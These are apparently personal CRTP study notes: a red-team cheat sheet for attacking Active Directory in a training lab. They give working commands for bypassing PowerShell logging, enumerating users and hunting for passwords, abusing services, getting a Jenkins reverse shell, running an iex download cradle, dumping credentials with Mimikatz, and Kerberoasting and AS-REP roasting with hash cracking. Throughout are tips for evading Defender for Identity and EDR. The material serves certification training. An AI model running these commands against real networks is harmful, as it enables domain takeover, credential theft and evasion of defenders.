

- Make use of Invisi-shell, to bypass powershell security logging

- Never use NET commands for enumeration it uses SAMR which is complained by MDI

- Always check for Domain policy and kerberos policy, this is useful when you create tickets

- Always check properties of user like logoncount , badpasswordtime and once you think its a normal user then only proceed. because a dromant/unactive/decoy user will make noise

- Check description feilds of user/service accounts, they may contains passwords

- Any user who is part of multiple groups is interesting because there can be some misonfiguration possibly

Notes ref:

- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md#tools
- https://github.com/Abhinandan-Khurana/MY-CRTP-Notes/blob/main/README.md#download-executable-cradle
- https://0xd4y.com/2023/04/05/CRTP-Notes/#97fbc391-4c15-458d-9f49-2426eb2a646d
- https://www.scribd.com/document/624871691/CRTP-full-exam-report
- https://secybr.com/posts/certified-red-team-professional-CRTP-review/

# Tools

**Enumeration**

- [ADModule](https://github.com/samratashok/ADModule)
    - Can be used even in `ConstrainedLanguage mode` because it is signed by Microsoft, also makes detection harder
         
        Use by writing dll to disk
        ```
        PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
        PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
        PS C:\> Get-Command -Module ActiveDirectory
        ```
        Use without writing the DLL to disk:   
        ```
        PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
        ```

- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)     
    - Great For Enumeration, used by pentesters and red teamers (not stealthy), not signed by Microsoft

NOTE - Never use NET command for domain enumeration, beause NET uses a command called SAM remote (SAMR), while other tools which we use like Powerview or AD-Module uses LDAP. It is much normal to request things using LDAP. Always use a LDAP based tool. MDI (Defender for Identity) complains when we use SAMR

**Post Exploit Enumeration**

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Misconfiguration Abuse

- [Privesc.ps1](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1) General Priv Esc Enumeration Tool

**Privilege Escalation**

- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compliled version](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe)

- [ASREPRoast.ps1](https://github.com/HarmJ0y/ASREPRoast) (Its functionality has been incorporated into Rubeus via the "asreproast" action)

# Bypassing Powershell logging -  `Invisi-shell`

Before loading our Ad-Module or Powerview, make sure to run below file,  this will bypass powershell local enhanced logging(which contains `system word prescription`, `AMSI` and `script block logging` )

- With Admin Privileges
```
RunWithPathAsAdmin.bat
```
- With Non-Admin Privileges
```
RunWithRegistryNonAdmin.bat
```

This will start a new powershell session without local enhanced logging
![alt text](/ss/image-0.png)

# Domain Enumeration

#### Basic

```
                                            PowerView               AD-Module

Get Current Domain                          Get-Domain                          Get-ADDomain
Get Current Domain SID                      Get-DomainSID                       (Get-ADDomain).DomainSID 
Get Current Domain Policy                   Get-DomainPolicy
Get Current Domain Kerberos Policy          (Get-DomainPolicy).KerberosPolicy
Get Current Domain Controller               Get-DomainContorller                Get-ADDomainController

Get Another Domain                          Get-Domain -Domain example.local     Get-ADDomain -Identity example.local
Get Another Domain policy                   (Get-DomainPolicyData -domain example.local).systemaccess
Get Another Domain Controller               Get-DomainController -Domain example.local                  Get-ADDomainController -DomainName example.local -Discover
```
![alt text](/ss/image-1.png)

> gives us the name of domain ie dollarcorp,  forest domain name, there seems to be only 1 DC ie dccorp-dc,  we also have child domain

![alt text](/ss/image-2.png)

> Domain Policy gives us information on password policy, which is useful for password spray attack
> Kerberos policy: the `MaxTicketAge` is the age(in hrs) of a TGT allowed in domain, you can renew a TGT in upto 7 days. The `MaxServiceAge` is age(in minutes) of TGS ie service ticket in domain
> Why important? - When we forge tickets, for ex like Golden ticket or silver ticket we need to comply with kerberos policy of target domain which redues the chances of detection. for example if you use Mimikatz for creating a ticket, now mimikatz by default creates a ticket with 10 years of lifetime with unlimited renewals, now such thing can be easily caought from security logs on DC by a SIEM tool, there we must enumerate kerberos policy

![alt text](/ss/image-3.png)



#### Users
```
List Users in Current Domain                Get-DomainUser                              Get-ADUser 
                                            Get-DomainUser | select SamAccountName
                                            
                                                                                        Get-ADUser -Filter * -Properties *
                                                                                        Get-ADUSer -Identity user1 -Properties *
Check Unactive/Dormant users                Get-DomainUser | select logonCount

List all properties of user in              Get-DomainUser -Identity user1 -Properties *
the current Domain                          Get-DomainUser -Properties SamAccountName,logonCount

                                            Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
                                            Get-ADUser -Filter * -Properties * | select name,logonCount, @{expression={ []datetime::fromFileTime (&_.pwdlastset) }}

Group Membership of the user                Get-DomainGroup -UserName "user1"           Get-ADPrincipalGroupMember -Identity user1
                                                                                        Get-ADPrincipalGroupMembership -Identity <USER>

Check User accounts description              Get-DomainUser | Select name,Description

Search particular string in a user's        Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
Description
                                            Get-ADUser -Filter 'Description -Like "*built*"' -Properties Description | Select Name,Description


Get Actively logged on Users on a Computer  Get-NetLoggedOn -ComputerName dcorp-dc
(need local admin rights on the target)

Get locally logged Users on a Computer      Get-LoggedOnLocal -ComputerName dcorp-adminsrv
(need remote registry on the target - 
started by default on server OS)

Get the last logged on users on a computer  Get-LastLoggedOn -ComputerName dcorp-adminsrv
(need administrative rights 
and remote registry on the target)

Get users which are in a local group        Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity xcorp-user1
of a machine using GPO

``` 
![alt text](/ss/image-4.png)

![alt text](/ss/image-5.png)

> Why enumerating properties like logoncount - It can be possible that you found credentials for a user but that user is not active or domant, without knowing that if you use that user it would create noise unnecesory.

![alt text](/ss/image-6.png)

> Check description feilds of user/service accounts, they may contains passwords

![alt text](/ss/image-7.png)

> Group membership of a user

![alt text](/ss/image-11.png)

![alt text](/ss/image-12.png)
#### Groups
```
List All Groups in the current Domain       Get-DomainGroup | Select Name               Get-ADGroup -Filter *
                                            Get-DomainGroup -Domain <targetdomin>       Get-ADGroup -Filter * | Select Name
                                                                                        Get-ADGroup -Filter * -Properties *
List all groups that contains *admin*       Get-DomainGroup -Name *admin* | select cn 
 in their name

List members of "Domain Admin" group        Get-DomainGroupMember -Identity "Domain Admins"

Get Enterprise Admin group                  Get-DomainGroup -Name "Enterprise Admins" -Domain moneycorp.local

List Enterprise Admin group memebership     Get-DomainGroupMember -Name "Enterprise Admins" -Domain moneycorp.local

Group Membership of the user                Get-DomainGroup -UserName "user1"           Get-ADPrincipalGroupMember -Identity user1
                                                                                        Get-ADPrincipalGroupMembership -Identity <USER>

List all the local groups on a machine      Get-NetLocalGroup -ComputerName dcorp-dc
(need administrator privs on the non-dc 
machine)

Get members of local group "Administrators" Get-NetLocalGroup -ComputerName dcorp-dc -GroupName Administrators         
on a machine (needs administrator privs 
on non-dc machines)

Get all the members of the 'Domain Admins'  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
group
                                            Get-ADGroupMember -Identity "Domain Admins" -Recursive

Get all the groups containig the            Get-DomainGroup *admin*                     
word 'admin' in group name                  
                                            Get-ADGroup -Filter 'Name -Like "*admin*"' | Select Name
```
![alt text](/ss/image-9.png)

![alt text](/ss/image-10.png)

![alt text](/ss/image-13.png)

![alt text](/ss/image-14.png)

![alt text](/ss/image-15.png)

![alt text](/ss/image-16.png)

![alt text](/ss/image-17.png)


#### Computers
```
List Computers in Current Domain            Get-DomainComputer | select cn
                                            Get-DomainComputer | select cn, logoncount
                                            Get-DomainComputer | select Name                        Get-ADComputer -Filter *
                                            Get-DomainComputer -OperatingSystem "*Server 2022*"     Get-ADComputer -Filter * | Select Name
                                            Get-DomainComputer -Ping                                Get-ADComputer -FIlter * | -Properties *                                           Get-AdComputer -Filter 'OperatingSystem -Like "*Server 2022*"' -Properties OperatingSystem | Select name,OperatingSystem                                         GEt-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

Find computers where a domain admin         Find-DomainUserLocation -Verbose
(or specified user/group) has sessions      Find-DomainUserLocation -UserGroupIdentity "RDPUsers"   (NOTE that server 2019 onwards, local administrator privileges are required to list sessions.)

Find computers (file servers and            Find-DomainUserLocation -Stealth
distributed file servers) where a 
domain admin session is available

Get Actively logged on Users on a Computer  Get-NetLoggedOn -ComputerName dcorp-dc
(need local admin rights on the target)

Get locally logged Users on a Computer      Get-LoggedOnLocal -ComputerName dcorp-adminsrv
(need remote registry on the target - 
started by default on server OS)

Get the last logged on users on a computer  Get-LastLoggedOn -ComputerName dcorp-adminsrv
(need administrative rights 
and remote registry on the target)

Get machines where the given user is        Get-DomainGPOUSerLocalGroupMapping -Identity user1 -Verbose
member of a specific group
```
![alt text](/ss/image-8.png)
> We see list of computers, we also verify that all the coumputer accounts are assosiated with an active machine by logoncount, which can let us know if any account is dormant/decoy/unactive

#### ACLs
```
Get the ACLs associated with the            Get-DomainObkectAcl -SamAccountName user1 -ResloveGUIDs
specified object

Search for interesting ACLs                 Find-InterestingDomainAcl -ResolveGUIDs
                                           
Get Active Directroy Rights 
for a GUID (like here : "RDP USers")        Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} | select ObjectDN,ActiveDirectoryRights

Find permissions identity has for users     
in domain                                   Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<GROUP_NAME_OR_USER_NAME>"}

Get the ACLs associated with the specified path     Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

> We can see DACL through properties tab. below is example of a domain admin user he has Full Control which means GenericAll permission
![alt text](/ss/image-25.png)

#### OU & GPO   
```
Get OUs in a Domain                         Get-DomainOU                            Get-ADOrganizationallUnit -Filter * -Properties *
                                            Get-DomainOU | select Name

Get GPO applied on an OU.                   Get-DomainGPO -Identity "GPO_NAME"

```
List all the Computers in the OU

Note - % means :- ForEach-Object | $_ means :- current Object
```
(Get-DomainGPO -Identity <OU Name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select Name

# for example - List all the Computers in the StudentMachinesOU
(Get-DomainGPO -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select Name
```
![alt text](/ss/image-18.png)

> Note that you can only get names of GPO, you cant get settings of GPO, to see that you need to go to sysvol

![alt text](/ss/image-20.png)

> You can get GPO applied on OU by gplink attribute

![alt text](/ss/image-21.png)

![alt text](/ss/image-22.png)

![alt text](/ss/image-24.png)

#### Files & Shares
```
Get Shares in host in the current Domain    Invoke-ShareFinder -Verbose

Find sensitive files on a computer          Invoke-FileFinder -Verbose
in the current Domain

Get all fileservers of the Domain           Get-NetFileServer
```
#### Forest & Trusts
```
Get all Domains in the current Forest       Get-ForestDomain                            (Get-ADForest).Domains
                                            Get-ForestDomain -Forest eurocorp.local

Get a list of all Domain trusts             Get-DomainTrust                                         
for the current domain                      Get-DomainTrust -Domain us.dollarcorp.moneycorp.local

                                            Get-ADTrust
                                            Get-ADTrust -Identity us.dollarcorp.moneycorp.local

Map external trusts for current domain       Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ? {$_.TrustAttributes -eq "FILTER_SID"}


Get all the global catalogs                 Get-ForestGlobalCatalog
for the current Forest                      Get-ForestGlobalCatalog -Forst eurocorp.local
                                            Get-ADForest | Select -ExpandProperty GlobalCatalogs
```
![alt text](/ss/image-33.png)

![alt text](/ss/image-35.png)

![alt text](/ss/image-34.png)


# Trusts

Trust is a relationship betweek two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.

A `Tusted Domain Object` represents the trust relationships in a domain

**Trust Direction**

1. One-way-trust

![alt text](/ss/image-26.png)

2. Two-way-trust

![alt text](/ss/image-27.png)

3. Transitive and Non-Transitive

![alt text](/ss/image-28.png)

**Trust Types**

1. Defult / Automatic trusts (Parent-child, Tree-root)

![alt text](/ss/image-29.png)

2. External Trusts (Trust between childs of two forests)

![alt text](/ss/image-30.png)

3. Forest Trust (Trust between forest root of two forest)

![alt text](/ss/image-31.png)

**Example**

![alt text](/ss/image-32.png)

- We can see Parent-child trust between moneycorp.local and dollarcorp.moneycorp.local

- We can see External Trust between and dollarcorp.moneycorp.local and eurocorp.local

# Post Exploit Enumeration
```
1. Local Admin Access in other Domain Machine: 
                                                Find if user has Local Admin Access/ ie if it is part of Local Admininstrator in any other domain machine

2. Domain Admin Session on other Domain Machine:
                                                Check if there is session of any Domain Admin in any other machine in target domain.

```

**1. Find Local Admin Access in other Domain Machine**
```
PowerView               Find-LocalAdminAceess -verbose

WMI                     FindWMILocalAdminAccess.ps1

PowerShell remorting    Find-PSRemortingLocalAdminAccess.ps1

```
Check if our current user has `Local Admin Access` in any other machine in target domain.

**PowerView**

> This function will query the DC of current or provided domain for a list of computers(Get-NetComputer) and then use Multithreaded Invoke-CheckLoaclAdminAcess on each machine

> NOTE - This is very noisy,  there will be security event id(4624,4634 and 4672) on each machine, which sufficient for you to get detected.

![alt text](/ss/image-36.png)


**Powershell Remorting**

> this script would go to each and every machine in domain and try to run a poershell remorting command on that and in case of success we will have admin privileges on a machine.
![alt text](/ss/image-47.png)

> This is also noisy as we are going to each machin and trying to login using powershell remoriting

**2. Domain Admin Session on other Domain Machine**

If there is session of a Dmain Admin and we have local admin acess, there are high chances that we can extract credentials of that domain admin from that machine. Check if there is session of any Domain Admin in any other machine in target domain.

```
PowerView                   FindDomainUserLocation -Verbose
                            FindDomainUesrLocation -UserGroupIdentity "RDPUsers"

InvokeSessionHunter         Invoke-SessionHunter -FailSafe
                            Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\Servers.txt
```

**PowerView**

> This function will query the DC of current or provided domain for the members of group (Domain Admin by default) using `Get-DomainGroupMember`, then gets a list of computers (`Get-DomainComputer`) and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from the machine

> This is also Noisy with same security event ids same as finding local admin access, only diffrence is we are finding sessionin this case.

**[InvokeSessionHunter](https://github.com/Leo4j/Invoke-SessionHunter)**

> Note From server 2019 onwards we need localAdminPrivileges to list Sessions, However tools like InokeSessionHunter can find sessions on a remote meachine even without local admin privileges. 
```
- List sessions on remote machines      Invole-SessionHunter -FailSafe

- On specefic machines                  Invole-SessionHunter -NoPortScan -Targets C:\AD\Tools\Servers.txt
```
In below example we found session for domain admin svcadmin user.
![alt text](/ss/image-37.png)


# Local Privesc

```
PowerUp                     Invoke-AllChecks

PrivEsc                     Invoke-PrivEsc

Winpeas                     winPEASx64.exe

BloodHound                  Import-Module .\SharpHound.ps1 
                            Invoke-BloodHound -CollectionMethod All         (This will give you a zip file, better use bloodhound python from kali)
```
Note - do not use BloodHound in red team engagements (very noisy!) use PowerView and PowerUp instead

![alt text](/ss/image-38.png)

Note - In CRTP focus is not on finding and exploiting Misconfigured service.

# Service Misconfiguration

**Using PowerUp**

1. Unquoted Service Path
> Get services with unquoted paths and a space in their name
```
Get-ServiceUnquoted -Verbose
```
2. Overly Permissive Write Permissions on Service Binary
> Get services where current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```
3. Service Permissions Issue
> Get the service whose configuration current user can modify
```
Get-ModifiableService -Verbose
```

# Feature Abuse - Jenkins

**Abuse Ability to Configure Builds**

![alt text](/ss/image-39.png)

# Example hack

![alt text](/ss/image-40.png)
```
1. Elevate to Local Administrator: Local Privilege Escalation by abusing misconfigured service.
2. Finding other domain machine where user has Local Administrator aceess.
3. Abusing Privileges of a user Jenkins and getting Admin acess. (here jenkins is an exmple, in real you can have any application in enterpise)
```
1. We will load PowerUp (in case of actual asessment use Winpeas since its much better), before that we will load invisi-shell to get rid of powershell logging

![alt text](/ss/image-41.png)

![alt text](/ss/image-42.png)

> NOTE- in case of actual asessment use Winpeas to find local privesc since its much better

We see we can abuse service 'AbyssWebServer' using function "Invoke-ServiceAbuse -Name 'AbyssWebServer'" which is actually a PowerView function itself.

![alt text](/ss/image-43.png)
![alt text](/ss/image-44.png)

![alt text](/ss/image-45.png)
![alt text](/ss/image-46.png)

> To reflect us as administrator we simply need to logoff and re-login into machine 

> Now since we are part of local administrators lets move to second task,  ie find if we have local admin access on any other domain machine

> we will use Powershell remorting for this, this script would go to each and every machine in domain and try to run a poershell remorting command on that and in case of success we will have admin privileges on a machine.

![alt text](/ss/image-48.png)

So we found that we have admin privileges on 'dcorp-adminsrv', now on this machine thre is jenkins server, we will try to get admin privilges on it.

![alt text](/ss/image-49.png)

We see there are 3 users so we simply try to login with builduser with password as builduser, after login we see multiple projects 

![alt text](/ss/image-50.png)

Go to any project and go into the Configuration, then add built step, select Execute windows batch command

![alt text](/ss/image-51.png)

We will simply provide a powershell reverseShell (we are dowmload it from our attack machine and then connect it on 443 port on our attack machine)

![alt text](/ss/image-52.png)

![alt text](/ss/image-53.png)

On Attacker Machine(ie our Student VM) turn the firewall off and use http server to listen or use netcat

![alt text](/ss/image-54.png)

Once your file server to fetch reverse shell and your reverse shell listerner is ready, Click on "build now"

![alt text](/ss/image-55.png)

You would see a connect back at your file server, and then you will get reverse Shell

![alt text](/ss/image-56.png)

![alt text](/ss/image-57.png)

Note - even hostname and username command sometimes create noise is it recommended to make use of enriornment variables, you can get a list of them useing command "ls env:"

NOTE - It is advised by Nikhil to not to use Reverse Shell at all in real engagement, intead use your C2

# BloodHound

![alt text](/ss/image-58.png)

BloodHound CE is much faster

You dont need Bloodhound in target environment, all you need is ingestors ie iether `SharpHound.ps1` or `SharpHound.exe`

![alt text](/ss/image-59.png)

For red Teamers, To Avoid detections below are some Stealthy options

![alt text](/ss/image-60.png)

# Lateral Movement

```
PowerShell Remorting            Enter-PSSession -ComputerName <computerName>

                                $computer = New-PSSession -ComputerName <computerName>
                                Invoke-Command -Session $computer -ScriptBlock {ls env:}

Winrs                           winrs: -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```
**PowerShell Remoting**

> PowerShell Remoting (PSRemorting) is much better alternative to psexec, its more silent and super fast!. it uses WinRM on Target , winRM is there by default in server 2012 and above with a firewall exception.

> The reason we should not use psexec, becuase it literally dorps and psexec.exe in system 32 directory, it then runs it for you to get your connection, Red Teams have stop using it a decade ago for this reason.

> Note that to perform Powershell remoting we need an admin access ie part of local admin group

We can do it 2 ways, one is using "Enter-PSSession" and another is using "Invoke-Command", both shown below
```
Enter-PSSession -ComputerName <computerName>
```
```
$computer = New-PSSession -ComputerName <computerName>
Enter-PSSession -Session $computer
```
```
$computer = New-PSSession -ComputerName <computerName>
Invoke-Command -Session $computer -ScriptBlock {ls env:}
```
Note that Invoke-Command will just execute command, will not give a interactive session

![alt text](/ss/image-62.png)

![alt text](/ss/image-63.png)


> Red Team Note: The PowerShell remoting will use powershell on target and hence will generate powershell logs which EDR ie MDE will detect, more stealthy option is `Winrs`. However `Winrs` will not make noise for EDR but MDI will detect it.

**Winrs**
```
winrs: -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```
![alt text](/ss/image-64.png)


# Extract Credentials

Once we have access to remote machine we can prceed with credential extraction
```
MimiKatz            Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

This is abusing LSASS to get credentials, there are many other ways like DPAPI, browser etc...

Now once you have credentials how do you replay them?? Ans-> Over Pass the Hash

# OverPass-The-Hash

Now once you have credentials how do you replay them?? Ans-> Over Pass the Hash



> Red team Note - Note it is always recommended to use AES keys, do not use RC4 ie NTLM hash because tools like MDI would detect it

# Domain PrivEsc

## Kerberosting

**Find user accounts used as Service accounts / which has SPN set**

ActiveDirectory module 
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
PowerView
```
Get-DomainUser -SPN
```
Rubeus
```
Rubeus.exe kerberoast /user:svcadmin /simple
```
To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```
**Kerberoast all possible accounts**
```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```
**Crack hashes using John the Ripper**
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
```

## AS-REP Roasting

**Enumerating accounts with Kerberos Preauth disabled**

ActiveDirectory module
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
PowerView
```
Get-DomainUser -PreauthNotRequired -Verbose
```

**Exploit and get Hash**

Rubeus
```
Rubeus.exe asreproast /format:john /outfile:hash.txt
```
ASREPRoast.ps1 (Its functionality has been incorporated into Rubeus via the "asreproast" action)
```
powershell -ep bypass
Import-Module .\ASREPRoast.ps1
Invoke-ASREPRoast
Invoke-ASREPRoast | select -ExpandProperty Hash > hashdump
```

**Crack hashes using John the Ripper**
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
```

## Targeted Kerberosting - Set SPN

With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).

Enumerate the permissions for RDPUsers on ACLs using PowerView
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```



## Kerberos Delegation
### UnConstrained
### Constrained
### RABCD
## ADCS

# Trust Abuse
## MSSQL

# Lateral Movement
## PowerShell Remoting
## OverPass the Hash

# Domain Persistence
## Golden Ticket (Forged TGT)
## Silver Ticket (Forged TGS)
## Diamond Ticket (Modified TGT)
## Skeleton Key
## DSRM
## Custom SSP (Security Support Provider)
## ACLs
### AdminSDHolder
### Rights Abuse
### Security Descriptors

# Forest Privilege Escalation
## MSSQL

# Forest Persistence
## DcShadow

# Avoiding Detection
## AMSI Bypass
## Real-time Monitoring Bypass
## AV Signatures Bypass

# Defends
